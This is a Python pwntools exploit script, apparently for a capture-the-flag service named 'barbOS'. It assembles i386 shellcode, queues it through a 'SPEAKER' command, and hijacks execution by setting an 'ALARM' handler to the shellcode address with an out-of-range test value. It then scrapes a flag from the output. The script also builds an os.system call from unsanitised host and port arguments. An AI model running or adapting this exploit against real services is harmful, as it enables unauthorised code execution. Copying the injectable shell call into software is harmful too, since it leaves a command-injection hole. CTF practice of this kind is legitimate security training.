#!/usr/bin/env python3

from pwn import *
import argparse
from itertools import product
from random import randrange
from time import sleep
import sys
#from base64 import b64encode
def b64encode(s):
    return s

context.log_level = 'debug'

def a(assembly):
    return asm(assembly, arch="i386")

PROMPT = b'barbOS> '
sc = a("mov eax, 0xFF24f0FF") + a("shl eax, 8;shr eax, 16;shl eax, 8") + a("push eax") + a("mov ebx, 0xFF112634") + a("shl ebx, 8;shr ebx,8") + a("call ebx")
context.update(arch='i386', os='linux')
avoid = b'\x00\x13\x14\x10'
shellcode = sc
#shellcode = b'\xeb\xfe'

def cmd(s, b:bytes):
    s.send(b64encode(b) + b'\n')
    r = s.recvuntil(PROMPT, timeout=2)
    if r.endswith(PROMPT):
        return r[0:-len(PROMPT)]

def pwn(s):
    buf = f'SPEAKER queue '.encode('utf-8') + shellcode
    cmd(s, buf)
    shellcode_address = p32(0x242bda) * 2
    cmd(s, b'ALARM test 5')
    cmd(s, b'ALARM settest ' + shellcode_address)
    cmd(s, b'ALARM test 2147483647')
    x = ""
    for i in range(0,100):
        try:
            x = s.recvuntil(b"\n")
            if "000" in x.decode("utf-8"):
                y = x.decode("utf-8")
                print(len(y))
                print("FLAG: " + x.decode('utf-8'))
                sys.exit(0)
        except:
            sys.exit(0)
            pass



def check1(host, port):
    os.system("python3 /wsprox.py " + host + " " + str(port) + " >/dev/null &")
    sleep(1)
    s = remote("localhost", 1338)
    #s.recvuntil("welcome to barbOS...")
    pwn(s)
    s.interactive()
    s.close()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('host')
    ap.add_argument('port', type=int)
    args = ap.parse_args()
    check1(args.host, args.port)

if __name__ == '__main__':
    main()
